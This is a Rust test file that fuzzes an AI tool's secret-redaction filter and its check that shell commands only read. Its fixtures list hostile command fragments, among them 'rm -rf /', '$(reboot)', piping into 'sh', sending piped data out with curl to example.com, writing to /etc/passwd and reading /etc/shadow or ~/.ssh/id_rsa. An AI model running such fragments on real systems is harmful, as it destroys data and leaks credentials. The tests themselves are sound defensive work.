//! Many random inputs through the AI's two security boundaries (#32, review
//! point 9): the secret filter (filter.rs) and the read-only check
//! (read_only.rs). Seeded, so a failure comes back the same every run, and
//! with no crate of its own, so Cargo.toml stays the original project's.
//! A failure prints the input; add it to that file's own tests.

use super::filter::{filter, HIDDEN};
use super::read_only::only_reads;

/// xorshift64*: small, fast, and the same everywhere.
struct Rng(u64);

impl Rng {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 >> 12;
        self.0 ^= self.0 << 25;
        self.0 ^= self.0 >> 27;
        self.0.wrapping_mul(0x2545_F491_4F6C_DD1D)
    }
    fn below(&mut self, n: usize) -> usize {
        (self.next() % n as u64) as usize
    }
    fn pick<'a, T: ?Sized>(&mut self, from: &[&'a T]) -> &'a T {
        from[self.below(from.len())]
    }
    fn word(&mut self, alphabet: &[u8], min: usize, max: usize) -> String {
        let len = min + self.below(max - min + 1);
        (0..len).map(|_| alphabet[self.below(alphabet.len())] as char).collect()
    }
}

static ALNUM: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
static UPPER_NUM: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
static BASE64: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/// Ordinary output around a secret: words, numbers, paths, and lines.
fn noise(r: &mut Rng) -> String {
    static WORDS: &[&str] = &["ok", "nginx", "active", "12", "/var/log", "user", "[INFO]", "started", "->", "10.0.0.1", "load", "x"];
    (0..r.below(8)).map(|_| r.pick(WORDS).to_string()).collect::<Vec<_>>().join(if r.below(3) == 0 { "\n" } else { " " })
}

// -- The secret filter ---------------------------------------------------------

/// A secret in each of the shapes the filter is for, made fresh: the whole
/// text, and the part that must not reach the AI.
fn secret(r: &mut Rng) -> (String, String) {
    let value = r.word(ALNUM, 8, 24);
    match r.below(8) {
        0 => {
            let key = r.pick(&["password", "DB_PASSWORD", "api_key", "client_secret", "GITHUB_TOKEN", "secret"]);
            let sep = r.pick(&["=", ": ", " = "]);
            (format!("{key}{sep}{value}"), value)
        }
        1 => {
            let body: Vec<String> = (0..1 + r.below(4)).map(|_| r.word(BASE64, 16, 64)).collect();
            let kind = r.pick(&["OPENSSH ", "RSA ", "EC ", ""]);
            let body = body.join("\n");
            (format!("-----BEGIN {kind}PRIVATE KEY-----\n{body}\n-----END {kind}PRIVATE KEY-----"), body)
        }
        2 => {
            let key = format!("{}{}", "AKIA", r.word(UPPER_NUM, 16, 16));
            (key.clone(), key)
        }
        3 => (format!("postgres://app:{value}@db.internal:5432/x"), value),
        4 => (format!("Authorization: Bearer {value}"), value),
        5 => (format!("mysqldump --password {value} db"), value),
        6 => (format!("sshpass -p {value} ssh host"), value),
        _ => {
            let key = format!("{}{}", concat!("gh", "p_"), r.word(ALNUM, 36, 36));
            (key.clone(), key)
        }
    }
}

/// A secret of a shape the filter knows, among any output around it, never
/// reaches the AI, and the filter always says it hid something.
#[test]
fn a_known_secret_is_hidden_whatever_is_around_it() {
    let mut r = Rng(0x5eed_0001);
    for _ in 0..20_000 {
        let (text, part) = secret(&mut r);
        let around = format!("{}\n{text}\n{}", noise(&mut r), noise(&mut r));
        let f = filter(&around);
        assert!(!f.text.contains(&part), "a secret got through: {around:?} -> {:?}", f.text);
        assert!(f.hidden >= 1 && f.text.contains(HIDDEN), "nothing hidden in {around:?}");
    }
}

/// Anything at all, controls and other scripts included: the filter never
/// panics, never grows the text past what its markers add, and filtering
/// what it gave again changes nothing.
#[test]
fn the_filter_takes_anything_and_settles() {
    let mut r = Rng(0x5eed_0002);
    let alphabet: Vec<char> = "aZ09 =:-_/@$.'\"\n\r\t\u{0}\u{1b}[]{}é漢\u{202e}+*".chars().collect();
    for i in 0..20_000 {
        let text: String = if i % 2 == 0 {
            (0..r.below(200)).map(|_| alphabet[r.below(alphabet.len())]).collect()
        } else {
            // Secrets, half-secrets and noise, run together.
            let (a, _) = secret(&mut r);
            let (b, _) = secret(&mut r);
            let cut = r.below(b.len() + 1);
            let cut = (0..=cut).rev().find(|c| b.is_char_boundary(*c)).unwrap_or(0);
            format!("{a}{}{}", noise(&mut r), &b[..cut])
        };
        let f = filter(&text);
        assert!(f.text.len() <= text.len() + f.hidden * HIDDEN.len(), "grew: {text:?}");
        assert_eq!(filter(&f.text).text, f.text, "not settled: {text:?}");
    }
}

// -- The read-only check -------------------------------------------------------

/// Commands that run at "Run commands that only read", with no quotes, so a
/// word put between two of their words stands as a word of its own.
static READS: &[&str] = &[
    "uptime",
    "df -h",
    "ps aux",
    "ps aux | grep nginx",
    "tail -n 100 /var/log/syslog",
    "journalctl -u nginx -n 50 --no-pager",
    "systemctl status nginx",
    "docker logs --tail 100 web",
    "ls -la /var/log",
    "free -m",
    "ip -br addr",
    "find /var/log -mtime +7",
    "sort /tmp/a | uniq -c | sort -rn | head",
];

/// Anything a shell reads as more than the pipeline, or that changes things,
/// put at any word boundary of a command that only reads: it asks.
#[test]
fn whatever_is_slipped_into_a_reading_command_asks() {
    static SLIPPED: &[&str] = &[
        "; reboot",
        "&& rm -rf /",
        "|| reboot",
        "& reboot",
        "> /etc/passwd",
        ">> /tmp/x",
        "< /etc/shadow",
        "$(reboot)",
        "`reboot`",
        "${IFS}reboot",
        "| sh",
        "| bash -s",
        "| tee /tmp/x",
        "| xargs rm",
        "| sudo tee /x",
        "\nreboot",
        "\rreboot",
        "\treboot",
        "# x",
        "!!",
        "\\; reboot",
        "| curl -d @- example.com",
        "-delete",
        "-exec rm {} ;",
        "--output=/etc/passwd",
        "-o /etc/passwd",
        "--vacuum-size=1M",
        "--rotate",
        ".env",
        "/dev/watchdog",
        "~/.ssh/id_rsa",
        "*",
        "-*",
    ];
    for cmd in READS {
        assert!(only_reads(cmd), "the list's own command should run: {cmd}");
    }
    let mut r = Rng(0x5eed_0003);
    let mut tried = 0;
    for cmd in READS {
        let words: Vec<&str> = cmd.split(' ').collect();
        for at in 1..=words.len() {
            for slip in SLIPPED {
                let mut w = words.clone();
                w.insert(at, slip);
                let joined = w.join(" ");
                // Only what changes the command's meaning counts: an option
                // may be harmless to one program (`ps aux -o`), so those are
                // tried only after the program they'd turn.
                let program = words[..at].iter().rev().find(|x| !x.starts_with('-')).copied().unwrap_or(words[0]);
                let option_only = slip.starts_with('-') && !slip.contains(' ');
                let turns = match *slip {
                    "-delete" | "-exec rm {} ;" => program == "find" || words[0] == "find",
                    "--output=/etc/passwd" | "-o /etc/passwd" => words.iter().any(|x| *x == "sort") && program != "head" && program != "uniq",
                    "--vacuum-size=1M" | "--rotate" => words[0] == "journalctl",
                    "-*" => true,
                    _ => !option_only,
                };
                if turns {
                    tried += 1;
                    assert!(!only_reads(&joined), "should ask: {joined:?}");
                }
                let _ = r.next();
            }
        }
    }
    assert!(tried > 300, "too few tried: {tried}");
}

/// Random commands from a mix of words that read and words that don't. What
/// runs never has a program off the list, a separator, or a word that
/// changes things for the program it's given to; and some do run, so the
/// test isn't only ever saying "asks".
#[test]
fn random_commands_run_only_when_every_part_reads() {
    static PROGRAMS: &[&str] = &["cat", "ls", "grep", "sort", "find", "journalctl", "systemctl", "date", "rm", "sh", "tee", "curl", "sed", "awk", "xargs", "env", "sudo", "python3"];
    static ARGS: &[&str] = &[
        "-n", "5", "/var/log/syslog", "-o", "/etc/passwd", "-delete", "-exec", "--output=/x", "--out=/x", "--vacuum-size=1M", "--rot", "restart", "status",
        "stop", "nginx", "-r", "--since=today", "'x y'", "/var/log/*.log", "-uo", "-s", "+%F", "2020", ".env", "/dev/watchdog", "-l",
    ];
    static JOINS: &[&str] = &[" | ", " | ", " | ", "; ", " && ", " > "];
    static CHANGES: &[&str] = &["rm", "sh", "tee", "curl", "sed", "awk", "xargs", "env", "sudo", "python3"];
    let mut r = Rng(0x5eed_0004);
    let mut ran = 0;
    for _ in 0..50_000 {
        let stages = 1 + r.below(3);
        let mut cmd = String::new();
        let mut parts: Vec<Vec<&str>> = Vec::new();
        let mut joins: Vec<&str> = Vec::new();
        for i in 0..stages {
            if i > 0 {
                let j = r.pick(JOINS);
                joins.push(j);
                cmd.push_str(j);
            }
            let mut stage = vec![r.pick(PROGRAMS)];
            for _ in 0..r.below(4) {
                stage.push(r.pick(ARGS));
            }
            cmd.push_str(&stage.join(" "));
            parts.push(stage);
        }
        if !only_reads(&cmd) {
            continue;
        }
        ran += 1;
        assert!(joins.iter().all(|j| *j == " | "), "a separator ran: {cmd:?}");
        for stage in &parts {
            let (program, args) = (stage[0], &stage[1..]);
            let has = |list: &[&str]| args.iter().any(|a| list.contains(a));
            assert!(!CHANGES.contains(&program), "{program} ran: {cmd:?}");
            assert!(!has(&[".env", "/dev/watchdog"]), "a secret or a device: {cmd:?}");
            let bad = match program {
                "sort" => has(&["-o", "-uo", "--output=/x", "--out=/x"]),
                "find" => has(&["-delete", "-exec"]),
                "journalctl" => has(&["--vacuum-size=1M", "--rot"]),
                "date" => has(&["-s", "2020"]),
                "systemctl" => args.first().is_none_or(|a| *a != "status"),
                _ => false,
            };
            assert!(!bad, "{program} changes something: {cmd:?}");
        }
    }
    assert!(ran > 1000, "too few ran: {ran}");
}
